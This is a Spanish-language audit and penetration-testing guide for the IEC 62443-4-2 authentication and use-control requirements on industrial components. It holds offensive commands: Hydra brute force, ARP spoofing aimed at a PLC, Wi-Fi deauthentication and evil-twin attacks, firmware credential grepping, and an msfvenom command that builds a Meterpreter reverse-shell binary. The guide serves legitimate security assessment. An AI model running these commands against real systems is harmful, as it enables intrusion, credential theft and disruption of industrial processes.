## FR 1: Identification and authentication control

### CR 1.1: Human user identification and authentication

**Objetivo:** Asegurar que solo usuarios legítimos y autorizados puedan acceder al sistema, estableciendo una identidad única para cada uno y previniendo el acceso anónimo o con credenciales compartidas. Esto es fundamental para la trazabilidad (accountability) y el control de acceso.

**PRUEBAS:**

*   **SL1:**
    *   **Descubrimiento de Interfaces:** Identificar todas las interfaces físicas y de red. Realizar un escaneo exhaustivo de puertos TCP/UDP para descubrir todos los servicios de gestión (HTTP/S, SSH, Telnet, FTP, SNMP, etc.).
    *   **Verificación de Autenticación Obligatoria:** Verificar que TODAS las interfaces de gestión descubiertas solicitan credenciales de forma obligatoria.
    *   **Prueba de Acceso Anónimo y por Defecto:** Intentar activamente el acceso anónimo y con credenciales por defecto documentadas o comunes (ej. admin/admin, root/password, cisco/cisco) a todos los servicios.
    *   [Herramientas]: Nmap, Metasploit (auxiliary/scanner), curl, telnet, smbclient.
    *   [Comando Ejemplo]: `nmap -sV -p- --open --script=auth-methods,ssh-auth-methods <IP_OBJETIVO>`

*   **SL2 (Añade RE 1: Identificación Única):**
    *   **Verificación de Unicidad de Cuentas:** A través de la interfaz de gestión, verificar que no es posible crear dos usuarios con el mismo identificador (username). Probar variaciones de mayúsculas/minúsculas si aplica.
    *   **Ataque de Credenciales Comunes:** Utilizar diccionarios de contraseñas comunes contra cuentas de usuario conocidas para verificar la robustez de las contraseñas elegidas y la ausencia de cuentas genéricas. Las cuentas deben ser nominales.
    *   [Herramientas]: Hydra, Burp Suite Intruder, Metasploit.

*   **SL3/4 (Añade RE 2: MFA):**
    *   **Verificación de Implementación MFA:** Confirmar que el MFA es requerido para todas las formas de acceso, especialmente en interfaces expuestas a redes menos confiables.
    *   **Intento de Bypass de MFA:**
        *   Probar la reutilización de tokens o códigos de un solo uso.
        *   Manipular la respuesta del servidor para simular una verificación de MFA exitosa.
        *   Explotar la función "recordar dispositivo" para eludir el MFA en sesiones posteriores.
        *   Verificar si el MFA puede ser deshabilitado por un usuario no-administrador.
    *   [Herramientas]: Burp Suite (Repeater, Intruder, Sequencer), OWASP ZAP.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nmap (Descubrimiento):** `nmap -sS -p- -T3 -sV --script=auth-methods <IP>` (Nota: Usar `-T3` o menor en OT para evitar saturación).
> *   **Hydra (Fuerza Bruta):** `hydra -L users.txt -P pass.txt ssh://<IP>` (Solo en entorno de laboratorio o con autorización explícita).
> *   **Curl (Acceso Anónimo):** `curl -I http://<IP>` o `curl -u anonymous:anonymous ftp://<IP>`.




### CR 1.2: Software process and device identification and authentication

**Objetivo:** Garantizar que las comunicaciones entre componentes del sistema (dispositivo a dispositivo, o software a dispositivo) son auténticas y no pueden ser suplantadas por un atacante.

**PRUEBAS:**

*   **SL2:**
    *   **Análisis de Tráfico No Cifrado:** Interceptar el tráfico de red durante el proceso de autenticación entre dispositivos para verificar si se envían credenciales, tokens o API keys en texto plano.
    *   **Ataque Man-in-the-Middle (MitM):** Ejecutar un ataque de ARP Spoofing o similar para interceptar y analizar la comunicación. El objetivo es verificar si el protocolo es vulnerable a la suplantación, robo de sesión o repetición de paquetes (replay attack).
    *   [Herramientas]: Wireshark, Bettercap, mitmproxy, Scapy. Se recomienda hacer uso de un TAP de red para estas pruebas.
    *   [Comando Ejemplo]: `sudo bettercap -iface <interfaz> -caplet http-ui`

*   **SL3/4 (Añade RE 1: Identificación Única y Autenticación Mutua):**
    *   **Validación de Autenticación Mutua (mTLS):** Verificar que los dispositivos utilizan identificadores únicos (certificados cliente) para autenticarse mutuamente. Intentar conectar sin un certificado válido, con uno autofirmado no confiable, o con uno revocado.
    *   **Spoofing de Dispositivo:** Intentar suplantar la identidad de un dispositivo legítimo utilizando su dirección MAC, IP y cualquier otro identificador capturado para obtener acceso no autorizado o inyectar datos falsos en el proceso.
    *   [Herramientas]: OpenSSL, custom scripts (Python/Scapy), Nemesis.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Wireshark:** `wireshark -k -i <interfaz>` (Filtrar por `http.auth` o `tcp.port==502` para Modbus).
> *   **Bettercap (ARP Spoofing):** `bettercap -iface eth0 -eval "net.probe on; set arp.spoof.targets <IP_PLC>; arp.spoof on"` (¡Cuidado extremo en redes OT en producción!).
> *   **OpenSSL (Cliente mTLS):** `openssl s_client -connect <IP>:443 -cert client.crt -key client.key -CAfile ca.crt`.



### CR 1.3: Account management

**Objetivo:** Asegurar que existe un mecanismo centralizado y seguro para gestionar el ciclo de vida completo de las cuentas de usuario (creación, modificación y eliminación), controlado únicamente por personal autorizado.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Verificación Funcional de Gestión de Usuarios:** Acceder como administrador y confirmar que existe un mecanismo claro para crear, modificar, deshabilitar y eliminar cuentas de usuario.
    *   **Prueba de Deshabilitación vs. Eliminación:** Verificar que una cuenta deshabilitada no puede autenticarse, y que sus permisos son revocados.
    *   **Integración con Sistemas Externos:** Si se declara compatibilidad con AD, LDAP o RADIUS, configurar la integración y verificar que la autenticación, mapeo de grupos a roles y gestión funcionan correctamente.
    *   **Escalada de Privilegios Horizontal:** Crear dos usuarios con permisos limitados y verificar que uno no puede gestionar, modificar o eliminar la cuenta del otro.
    *   [Herramientas]: Interfaz web/CLI del dispositivo, cliente LDAP (como `ldapsearch`), cliente RADIUS.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **LDAP Search:** `ldapsearch -x -h <IP_AD> -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -W` (Para verificar integración).
> *   **Burp Suite:** Usar para capturar peticiones de creación de usuario y probar si un usuario sin privilegios puede replicarlas (IDOR).



### CR 1.4: Identifier management

**Objetivo:** Implementar el principio de mínimo privilegio mediante un sistema de Control de Acceso Basado en Roles (RBAC), donde los permisos se asignan a roles en lugar de a usuarios individuales, simplificando la gestión y reduciendo errores.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Gestión de Roles y Permisos (RBAC):** Verificar que la interfaz permite crear, modificar y eliminar roles con permisos granulares (lectura, escritura, ejecución) para diferentes funciones del sistema.
    *   **Prueba de Asignación de Roles:**
        1.  Crear un rol personalizado con privilegios mínimos (ej. solo lectura de logs).
        2.  Asignar el rol a un usuario de prueba.
        3.  Iniciar sesión con ese usuario y verificar sistemáticamente que no puede realizar acciones no permitidas (ej. cambiar configuración, reiniciar dispositivo, ver datos de otros usuarios).
    *   [Herramientas]: Interfaz web/CLI del dispositivo, Burp Suite (para intentar acceder a URLs de administrador con sesión de bajo privilegio).

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Burp Suite (Autorize Plugin):** Automatiza la comprobación de acceso a recursos de administrador con cookies de usuario de bajo nivel.
> *   **Curl:** `curl -b "session=low_priv_cookie" http://<IP>/admin/reboot` (Prueba manual de acceso a API protegida).



### CR 1.5: Authenticator management

**Objetivo:** Proteger los autenticadores (contraseñas, tokens, claves) tanto en tránsito como en reposo para prevenir su robo y reutilización por parte de atacantes.

**PRUEBAS:**

*   **SL1/2:**
    *   **Verificación de Cambio de Credenciales por Defecto:** Confirmar que el sistema obliga al administrador a cambiar la contraseña por defecto en el primer inicio de sesión.
    *   **Análisis de Tráfico Cifrado:** Capturar el tráfico durante el login y verificar que la comunicación está cifrada con un protocolo robusto (TLS 1.2 o superior) y que no hay fugas de información.
    *   **Análisis de Almacenamiento de Credenciales:** Obtener una copia del firmware o acceso al sistema de ficheros. Localizar los ficheros que almacenan credenciales (ej. /etc/shadow, ficheros de configuración, bases de datos) y verificar que las contraseñas están hasheadas con un algoritmo robusto y "sal" única (SHA-256/512, bcrypt, Argon2).
    *   [Herramientas]: Wireshark, Binwalk (para extraer firmware), John the Ripper, Hashcat.

*   **SL3/4 (Añade RE 1: Seguridad por Hardware):**
    *   **Verificación de Hardware Security Module (HSM/TPM):** Revisar la documentación técnica y ejecutar comandos del sistema (si hay acceso) para confirmar la presencia y uso de un TPM/HSM o un TEE (Trusted Execution Environment).
    *   **Intento de Extracción de Claves:** Realizar un análisis de bajo nivel (debugging JTAG/UART) para intentar acceder a la memoria y verificar si las claves privadas están protegidas por el hardware y no son extraíbles en texto plano. (Nota: Prueba avanzada y potencialmente destructiva).
    *   [Herramientas]: Ghidra, IDA Pro, JTAGulator, Bus Pirate.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Binwalk:** `binwalk -e firmware.bin` (Extraer sistema de archivos).
> *   **Grep (Búsqueda de claves):** `grep -rE "password|key|secret" extracted_fs/`
> *   **John the Ripper:** `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` (Para probar la fortaleza del hash).
> *   **Hardware:** JTAGulator para identificar pines JTAG y OpenOCD para intentar volcar memoria.



### CR 1.6: Wireless access management

**Objetivo:** Asegurar que las interfaces de comunicación inalámbricas (Wi-Fi, Bluetooth, Zigbee, etc.) están protegidas con mecanismos de autenticación y cifrado robustos para prevenir el acceso no autorizado a la red. (APLICA SOLO SI EL COMPONENTE TIENE CAPACIDADES INALÁMBRICAS).

**PRUEBAS:**

*   **SL1:**
    *   **Análisis de Seguridad Wi-Fi:** Escanear las redes inalámbricas para identificar el protocolo de seguridad. Debe ser como mínimo WPA2-PSK con cifrado AES (CCMP). WEP y WPA-TKIP son inaceptables.
    *   **Ataques de Desautenticación:** Lanzar un ataque de desautenticación para verificar la resiliencia de la red y la capacidad de recuperación de los clientes.
    *   [Herramientas]: Aircrack-ng suite, Wifite, Kismet, Wireshark (con adaptador en modo monitor).
    *   [Comando Ejemplo]: `sudo airodump-ng wlan0mon`

*   **SL2/3/4 (Añade RE 1: Identificación Única):**
    *   **Verificación de 802.1X/EAP:** Confirmar que la red soporta un protocolo de autenticación robusto a nivel empresarial como EAP-TLS (WPA2/3-Enterprise), que utiliza certificados para la autenticación única de dispositivos.
    *   **Ataque de "Evil Twin":** Crear un punto de acceso falso con el mismo SSID para intentar capturar handshakes o credenciales en un entorno PSK, o para intentar un ataque de downgrade en un entorno Enterprise.
    *   [Herramientas]: hostapd-mana, eaphammer, Wi-Fi Pineapple.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Airodump-ng:** `airodump-ng --encrypt WPA wlan0mon` (Verificar cifrado).
> *   **Aireplay-ng (Deauth):** `aireplay-ng -0 5 -a <BSSID> wlan0mon` (Prueba de desconexión).
> *   **Hardware:** Tarjeta Wi-Fi Alfa (modo monitor), Ubertooth One (para Bluetooth).



### CR 1.7: Strength of password-based authentication

**Objetivo:** Forzar la creación de contraseñas robustas que sean resistentes a ataques de fuerza bruta y de diccionario, y gestionar su ciclo de vida para limitar la ventana de exposición en caso de compromiso.

**PRUEBAS:**

*   **SL1/2:**
    *   **Prueba de Política de Contraseñas:** Intentar establecer contraseñas débiles y verificar que el sistema las rechaza. Las políticas deben ser configurables y cubrir:
        *   Longitud mínima (ej. 12+ caracteres).
        *   Complejidad (mezcla de mayúsculas, minúsculas, números y símbolos).
        *   No contener partes del nombre de usuario o palabras de diccionario comunes.
    *   [Herramientas]: Burp Suite Intruder (con una lista de contraseñas débiles), interfaz de gestión.

*   **SL3 (Añade RE 1: Restricciones de generación y tiempo de caducidad):**
    *   **Verificación de Historial de Contraseñas:** Cambiar la contraseña de un usuario y luego intentar reutilizar contraseñas antiguas (ej. las últimas 5). El sistema debe impedirlo.
    *   **Verificación de Expiración de Contraseñas:** Configurar un tiempo de expiración corto (ej. 1 día) y verificar que el sistema fuerza el cambio de contraseña después de ese período.

*   **SL4 (Añade RE 2: Restricciones de caducidad para todos los usuarios):**
    *   **Aplicación Global de Políticas:** Aplicar las mismas pruebas de SL3 a cuentas de servicio, procesos de software y otros tipos de cuentas no humanas para verificar que las políticas de historial y expiración también aplican o pueden ser gestionadas de forma segura (ej. mediante claves o certificados).

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Manual:** Intentar cambiar password a "123456" o "password".
> *   **Hydra (Verificación de política):** Usar una lista de contraseñas comunes para ver si alguna cuenta por defecto las usa.



### CR 1.8: Public key infrastructure certificates

**Objetivo:** Asegurar que el componente valida correctamente los certificados digitales, confiando únicamente en aquellos emitidos por Autoridades de Certificación (CAs) confiables y rechazando los que no son válidos, para prevenir ataques de suplantación (spoofing) y Man-in-the-Middle. (APLICA SOLO SI HAY UN SISTEMA PKI).

**PRUEBAS:**

*   **SL2 a SL4:**
    *   **Validación de Cadena de Confianza:** Probar la conexión a servicios que usan PKI (ej. HTTPS, LDAPS) con certificados inválidos:
        *   Expirados.
        *   Revocados (verificando que el componente consulta CRL/OCSP).
        *   Autofirmados por una CA no confiable.
        *   Con un nombre común (CN) que no coincide con el del servidor.
        *   En todos los casos, la conexión debe ser rechazada con un error de seguridad.
    *   **Análisis de Algoritmos:** Asegurar que los certificados usan algoritmos de firma y longitudes de clave seguras (RSA >= 2048 bits, ECDSA >= 256 bits, con hash SHA-256 o superior).
    *   [Herramientas]: OpenSSL, testssl.sh, Burp Suite.
    *   [Comando Ejemplo]: `openssl s_client -connect <IP>:443`

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Testssl.sh:** `testssl.sh <IP>:443` (Reporte completo de certificados y vulnerabilidades SSL/TLS).
> *   **OpenSSL (Verificar certificado):** `openssl x509 -in cert.pem -text -noout`.



### CR 1.9: Strength of public key-based authentication

**Objetivo:** Garantizar que, cuando se utiliza autenticación basada en claves públicas (ej. para SSH o TLS), se emplean algoritmos criptográficos robustos y las claves privadas están protegidas adecuadamente contra la extracción. (APLICA SOLO SI HAY UN SISTEMA PKI).

**PRUEBAS:**

*   **SL2:**
    *   **Análisis de Suites de Cifrado (Cipher Suites):** Escanear los servicios que usan PKI (HTTPS, SSH) para identificar las cipher suites soportadas. Verificar que las suites débiles, obsoletas o de grado de exportación están deshabilitadas (ej. RC4, 3DES, MD5, NULL ciphers).
    *   [Herramientas]: testssl.sh, sslscan, Nmap (con scripts NSE como `ssl-enum-ciphers`).
    *   [Comando Ejemplo]: `testssl.sh <IP>:<PUERTO>`

*   **SL3/4 (Añade RE 1: Seguridad por Hardware):**
    *   **Verificación de Almacenamiento de Clave Privada:** Comprobar si se utilizan mecanismos hardware (smartcards, TPM, HSM) para proteger las claves privadas. Realizar las mismas pruebas de extracción que en CR 1.5 (SL3/4). La clave privada del servidor nunca debe ser extraíble.
    *   [Herramientas]: Documentación del fabricante, herramientas de debugging de hardware, Ghidra.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nmap (Enum Ciphers):** `nmap --script ssl-enum-ciphers -p 443 <IP>`.
> *   **Sslscan:** `sslscan <IP>:443`.



### CR 1.10: Authenticator feedback

**Objetivo:** Prevenir la enumeración de usuarios, una técnica en la que un atacante puede descubrir nombres de usuario válidos basándose en las diferencias en las respuestas del sistema a intentos de login.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prevención de Enumeración de Usuarios:** Realizar intentos de login con:
        *   a) usuario válido / contraseña incorrecta
        *   b) usuario inválido / contraseña aleatoria
        *   El mensaje de error y el código de respuesta HTTP deben ser genéricos e idénticos en ambos casos (ej. "Usuario o contraseña incorrectos").
    *   **Análisis de Canales Laterales (Side-Channel):** Inspeccionar las respuestas completas del servidor (tiempos de respuesta, códigos de error, cabeceras, tamaño del cuerpo de la respuesta) para asegurar que no hay diferencias sutiles que puedan filtrar si un usuario existe o no.
    *   [Herramientas]: Burp Suite (Intruder y Comparer), Patator, wfuzz.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Wfuzz:** `wfuzz -c -z file,users.txt -d "user=FUZZ&pass=wrongpass" --hc 404 http://<IP>/login`.
> *   **Burp Suite:** Usar "Comparer" para ver diferencias en longitud de respuesta entre usuario válido e inválido.



### CR 1.11: Unsuccessful login attempts

**Objetivo:** Mitigar los ataques de fuerza bruta online mediante el bloqueo temporal de cuentas tras un número determinado de intentos de autenticación fallidos.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Bloqueo de Cuentas:** Realizar un número configurable de intentos de login fallidos (ej. 5 intentos) y verificar que la cuenta se bloquea y no permite más intentos.
    *   **Verificación del Mecanismo de Desbloqueo:** Comprobar si el desbloqueo es automático por tiempo (ej. tras 15 minutos) o requiere intervención manual de un administrador, según la configuración de seguridad.
    *   **Prueba de Evasión:** Intentar evadir el bloqueo cambiando la IP de origen o las cabeceras HTTP (ej. User-Agent) para ver si el bloqueo se basa en la cuenta o en la IP. El bloqueo debe estar asociado a la cuenta.
    *   [Herramientas]: Burp Suite Intruder, Hydra, ffuf.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Hydra:** `hydra -l admin -p wrongpass -t 1 <IP> ssh` (Ejecutar 5-10 veces y ver si deja de responder).



### CR 1.12: System use notification

**Objetivo:** Presentar un aviso legal (banner) a los usuarios antes de que intenten autenticarse, informándoles de que el sistema es para uso autorizado, que su actividad puede ser monitorizada y las consecuencias del uso indebido.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Verificación del Banner de Notificación:** Acceder a todas las interfaces de gestión (Web, SSH, Telnet, Serial) y confirmar que se muestra un banner de advertencia legal y de monitorización *antes* de solicitar las credenciales.
    *   **Prueba de Configuración del Banner:** Iniciar sesión como administrador y verificar que el texto del banner es configurable para adaptarlo a las políticas legales de la organización. Modificarlo, guardar, cerrar sesión y verificar que el nuevo mensaje se muestra correctamente.
    *   [Herramientas]: Navegador web, cliente SSH/Telnet, PuTTY.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Netcat:** `nc <IP> 22` (Para ver el banner SSH sin loguearse).
> *   **Nmap:** `nmap --script banner <IP>`.



### CR 1.13: Access via untrusted networks

**Objetivo:** Asegurar que el componente puede restringir el acceso desde redes no confiables (ej. Internet, red corporativa) y que cualquier acceso permitido está explícitamente autorizado y registrado. Este control se solapa con 62443-3-3, pero el componente debe proporcionar la CAPACIDAD de ser configurado de forma segura.

**PRUEBAS:**

*   **SL1/2:**
    *   **Análisis de Exposición de Servicios:** Desde una red externa/no confiable, realizar un escaneo de puertos para identificar todos los servicios expuestos.
    *   **Prueba de Controles de Red (Firewall/ACLs):** Como administrador, verificar la existencia de un firewall o ACLs en el componente. Aplicar una regla de bloqueo para una IP de prueba y confirmar que el acceso desde esa IP es denegado.
    *   **Verificación de Logs de Acceso:** Revisar los logs del sistema para confirmar que todos los intentos de conexión (exitosos y fallidos) desde la red no confiable son registrados.
    *   [Herramientas]: Nmap, hping3.

*   **SL3/4 (Añade RE 1: Aprobación explícita):**
    *   **Prueba de Denegación por Defecto:** Intentar conectar desde una red no confiable sin ninguna regla de permiso explícita. La conexión debe ser rechazada por defecto (política "deny-all").
    *   **Prueba de Autorización Basada en Roles:** Asignar a un usuario un rol que permita el acceso remoto y verificar que la conexión es exitosa. Revocar el rol y verificar que la conexión es denegada, incluso si la ACL de red lo permite.
    *   [Herramientas]: Cliente de red (SSH, HTTPS), interfaz de gestión.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nmap (Escaneo externo):** `nmap -Pn -sS <IP>` (Desde una subred distinta).
> *   **Hping3 (Prueba de ACL):** `hping3 -S -p 80 -c 1 <IP>` (Verificar si llega SYN-ACK o nada).



### CR 1.14: Strength of symmetric key-based authentication

**Objetivo:** Proteger las claves simétricas (ej. Pre-Shared Keys - PSK) utilizadas para la autenticación, asegurando que se almacenan de forma segura y no pueden ser extraídas por un atacante con acceso al dispositivo.

**PRUEBAS:**

*   **SL2:**
    *   **Análisis de Almacenamiento de Clave Pre-compartida (PSK):** Obtener acceso al sistema de ficheros (vía shell o extrayendo el firmware). Localizar el fichero de configuración que contiene la PSK.
    *   **Verificación de Protección de la Clave:** La clave no debe estar en texto plano. Debe estar cifrada o, como mínimo, protegida por permisos de fichero muy restrictivos (ej. 600, solo legible por el usuario root).
    *   [Herramientas]: Binwalk, Ghidra, grep, `ls -l`.

*   **SL3/4 (Añade RE 1: Seguridad por Hardware):**
    *   **Prueba de Almacenamiento Seguro por Hardware:** Utilizar análisis de firmware y debugging de hardware para demostrar que la clave simétrica es gestionada por un elemento de hardware seguro (TPM, TEE, etc.) y nunca se expone en la RAM o el sistema de ficheros del sistema principal.
    *   [Herramientas]: Ghidra, JTAGulator, GDB.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Grep (Buscar PSK):** `grep -r "psk=" /etc/` (Si se tiene acceso a shell).
> *   **Binwalk (Entropía):** `binwalk -E firmware.bin` (Para buscar bloques cifrados donde podrían estar las claves).



## FR 2: Use control

### CR 2.1: Authorization enforcement

**Objetivo:** Una vez que un usuario está autenticado, asegurar que el sistema aplica estrictamente los permisos asignados a su rol, previniendo que pueda acceder a datos o ejecutar funciones para las que no está autorizado.

**PRUEBAS:**

*   **SL1:**
    *   **Prueba de Autorización Básica:** Crear usuarios con diferentes roles predefinidos (admin, operador, invitado). Para cada rol, intentar acceder a funciones y URLs de otros roles.
    *   **Prueba de Acceso Inseguro Directo a Objetos (IDOR):** Como usuario de bajo privilegio, intentar acceder a recursos (ej. `/config?user_id=1`) cambiando el identificador por el de un usuario con más privilegios (ej. `/config?user_id=admin`).
    *   [Herramientas]: Burp Suite, OWASP ZAP.

*   **SL2 (Añade RE 1 y 2: Autorización para todos y mapeo de roles):**
    *   **Prueba de Escalada de Privilegios Vertical:** Intentar ejecutar funciones de administrador (ej. crear usuario, cambiar configuración de red) con una sesión de usuario de bajo privilegio.
    *   **Prueba de Escalada de Privilegios Horizontal:** Intentar acceder o modificar datos pertenecientes a otro usuario con el mismo nivel de privilegios.

*   **SL3 (Añade RE 3: Anulación por supervisor):**
    *   **Verificación de Anulación por Supervisor:** Identificar si existe una función de "override" de emergencia. Verificar que solo un rol de supervisor puede activarla y que la acción queda registrada de forma destacada en los logs de auditoría.

*   **SL4 (Añade RE 4: Aprobación dual):**
    *   **Prueba de Control Dual (Principio de "Cuatro Ojos"):** Identificar funciones críticas (ej. parada de emergencia, actualización de firmware) y verificar que el sistema exige la aprobación de un segundo usuario autorizado antes de ejecutar la acción.
    *   [Herramientas]: Interfaz de gestión del dispositivo.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Burp Suite (Autorize):** Plugin esencial para probar automáticamente si un usuario "Low Priv" puede acceder a endpoints detectados por el usuario "Admin".
> *   **Curl:** `curl -X POST -d "param=value" -b "cookie=low_priv" http://<IP>/admin/action`



### CR 2.2: Wireless use control

**Objetivo:** Implementar controles adicionales para el acceso inalámbrico, como listas blancas de dispositivos, para restringir la conexión únicamente a los dispositivos explícitamente autorizados. (APLICA SOLO SI EL COMPONENTE TIENE CAPACIDADES INALÁMBRICAS).

**PRUEBAS:**

*   **SL1/2:**
    *   **Verificación de Controles de Acceso Inalámbrico:** Verificar que existen mecanismos para controlar qué dispositivos pueden conectarse, como filtrado de direcciones MAC o, preferiblemente, listas blancas de dispositivos basadas en certificados (en un entorno 802.1X).
    *   **Prueba de Conexión no Autorizada:** Intentar conectar un dispositivo no autorizado (con una MAC no incluida en la lista blanca) y verificar que la conexión es rechazada.
    *   **Prueba de Suplantación de MAC:** Cambiar la dirección MAC de un dispositivo atacante por la de un dispositivo autorizado e intentar conectarse.
    *   [Herramientas]: Interfaz de gestión del punto de acceso/dispositivo, `macchanger`.

*   **SL3/4:**
    *   **Verificación de Alertas:** Comprobar si los intentos de conexión de dispositivos no autorizados (fallidos por la lista blanca) generan una alerta en el sistema de monitorización (SIEM/syslog).

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Macchanger:** `macchanger -m <MAC_AUTORIZADA> wlan0`.
> *   **Airodump-ng:** Para identificar MACs de clientes legítimos conectados.



### CR 2.3: Use control for portable and mobile devices

**Objetivo:** Controlar el uso de puertos físicos (como USB) para prevenir la conexión de dispositivos no autorizados que podrían usarse para exfiltrar datos, introducir malware o ejecutar ataques.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Dispositivos USB no Autorizados:** Conectar diferentes tipos de dispositivos USB a los puertos físicos del componente:
        *   Almacenamiento masivo (pendrive).
        *   Adaptadores de red (USB-to-Ethernet).
        *   Teclados maliciosos (HID Attacks como Rubber Ducky).
        *   Teléfonos móviles.
    *   **Verificación de Política de Lista Blanca/Negra:** Verificar si el dispositivo los monta, los activa o acepta entrada de ellos. Comprobar si existe una política de "lista blanca" de dispositivos permitidos (por Vendor ID/Product ID) y si se puede configurar para bloquear todas las clases de dispositivos excepto las necesarias.
    *   [Herramientas]: Dispositivos USB variados, Hak5 Rubber Ducky, `lsusb` para verificar la detección.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Rubber Ducky / Bash Bunny:** Cargar un payload simple (ej. abrir notepad o escribir "test") para ver si el puerto acepta entrada HID.
> *   **USB Killer (Precaución):** NO USAR en auditoría real salvo destrucción planificada. Usar probadores de voltaje USB seguros.



### CR 2.4: Mobile code

**Objetivo:** Prevenir la ejecución de código no autorizado o malicioso (scripts, binarios) que pueda haber sido introducido en el dispositivo por un atacante.

**PRUEBAS:**

*   **SL1:**
    *   **Prueba de Ejecución de Código no Firmado:** Intentar cargar y ejecutar un script (ej. shell, python) o un binario compilado para la arquitectura del dispositivo a través de cualquier interfaz disponible (web, FTP, USB, shell).
    *   **Verificación de Permisos de Ejecución:** Comprobar si las particiones de datos (ej. `/tmp`, `/var`) están montadas con la opción `noexec` para impedir la ejecución de binarios desde ellas.

*   **SL2/3/4 (Añade RE 1: Autenticidad del código):**
    *   **Verificación de Mecanismos de Protección:** Verificar si existen mecanismos de control de aplicaciones como AppLocker (Windows), SELinux/AppArmor (Linux), firma de código obligatoria o listas blancas de aplicaciones que impidan la ejecución de cualquier binario que no esté explícitamente permitido o firmado por una CA confiable.
    *   [Herramientas]: Metasploit (msfvenom para generar payloads), netcat, OpenSSL.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Msfvenom:** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > evil.elf` (Generar binario de prueba).
> *   **Mount check:** `mount | grep noexec` (En shell del dispositivo).



### CR 2.5: Session lock

**Objetivo:** Proteger las sesiones de usuario activas contra el acceso no autorizado cuando el usuario se ausenta de la terminal, bloqueando la sesión automáticamente tras un período de inactividad.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Bloqueo de Sesión por Inactividad:** Iniciar sesión en una interfaz interactiva (Web, HMI local), esperar el tiempo configurado para el timeout de inactividad y verificar que la sesión se bloquea automáticamente o se cierra.
    *   **Prueba de Bloqueo Manual:** Verificar que existe una opción clara y accesible para que el usuario bloquee la sesión manualmente (ej. un botón de "Bloquear" o "Cerrar Sesión").
    *   **Verificación de Re-autenticación:** Confirmar que se requiere introducir de nuevo la contraseña para reanudar una sesión bloqueada.
    *   [Herramientas]: Interfaz de usuario del dispositivo, cronómetro.



### CR 2.6: Remote session termination

**Objetivo:** Proporcionar a los administradores la capacidad de ver y terminar forzosamente las sesiones de usuario activas, lo cual es crucial en caso de detectar una actividad sospechosa o una sesión olvidada.

**PRUEBAS:**

*   **SL2 a SL4:**
    *   **Prueba de Terminación de Sesión Remota:**
        1.  Iniciar una o varias sesiones remotas (SSH, web) con un usuario de prueba.
        2.  Iniciar sesión como administrador en otra terminal.
        3.  Verificar que existe una función para listar las sesiones activas, mostrando usuario, IP de origen y tiempo de actividad.
        4.  Utilizar la función para terminar forzosamente la sesión del usuario de prueba.
        5.  Confirmar que el usuario de prueba es desconectado inmediatamente.
    *   **Verificación de Cierre de Sesión en el Servidor:** Desde el cliente, cerrar la sesión (logout) y verificar que el proceso/conexión se cierra correctamente en el servidor y no quedan sesiones huérfanas.
    *   [Herramientas]: Comandos `who`, `w`, `ps`, `kill` en el servidor; interfaz de gestión.



### CR 2.7: Concurrent session control

**Objetivo:** Limitar el número de sesiones simultáneas que un usuario puede tener, para prevenir el agotamiento de recursos y dificultar el uso compartido de cuentas.

**PRUEBAS:**

*   **SL3/4:**
    *   **Prueba de Límite de Sesiones Concurrentes:** Verificar en la interfaz de administración que es posible configurar un límite de sesiones simultáneas por usuario (o por rol).
    *   **Intento de Exceder el Límite:**
        1.  Configurar el límite a un número bajo (ej. 1 o 2).
        2.  Establecer el número máximo de conexiones permitidas con el mismo usuario desde diferentes clientes o pestañas del navegador.
        3.  Intentar establecer una conexión adicional. Esta conexión debe ser rechazada con un mensaje claro.
    *   [Herramientas]: Múltiples clientes SSH/HTTPS, diferentes navegadores.



### CR 2.8: Auditable events

**Objetivo:** Asegurar que el componente registra de forma fiable todos los eventos relevantes para la seguridad, proporcionando una pista de auditoría que permita investigar incidentes, detectar actividades no autorizadas y cumplir con los requisitos normativos.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Generación de Logs:** Realizar una lista de acciones relevantes para la seguridad y ejecutarlas una por una. La lista debe incluir:
        *   Intentos de login (exitosos y fallidos).
        *   Cierre de sesión (logout).
        *   Creación, modificación o eliminación de usuarios/roles.
        *   Cambios en la configuración de seguridad (reglas de firewall, políticas de contraseña).
        *   Actualización de firmware (iniciada, exitosa, fallida).
        *   Reinicio o parada del sistema.
        *   Accesos a datos críticos.
    *   **Verificación de Contenido de Logs (The "5 Ws"):** Revisar los logs para confirmar que cada evento registrado contiene la información mínima necesaria para ser útil en una investigación:
        *   **Who:** ID del usuario o proceso que realizó la acción.
        *   **What:** Descripción del evento.
        *   **When:** Timestamp preciso y sincronizado.
        *   **Where:** Origen de la acción (IP de origen, nombre de la terminal).
        *   **Outcome:** Resultado (éxito/fallo).
